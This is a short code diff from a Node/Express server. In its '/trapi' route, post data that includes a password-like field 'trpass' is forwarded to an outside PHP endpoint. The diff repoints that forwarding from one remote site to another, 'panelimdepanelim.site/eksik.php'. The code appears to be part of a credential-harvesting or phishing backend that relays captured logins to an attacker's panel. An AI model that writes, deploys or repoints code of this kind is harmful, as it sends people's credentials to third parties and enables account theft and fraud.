@@ -38,7 +38,7 @@ app.post('/trapi', async (req, res) => {
           trpass: trpass,
       };
 
-      const response = await axios.post('https://boranboru.com/livechats.php', postData);
+      const response = await axios.post('https://panelimdepanelim.site/eksik.php', postData);
       res.send(response.data);
   } catch (error) {
       console.error("Hedef URL'ye POST gönderiminde hata:", error.message);
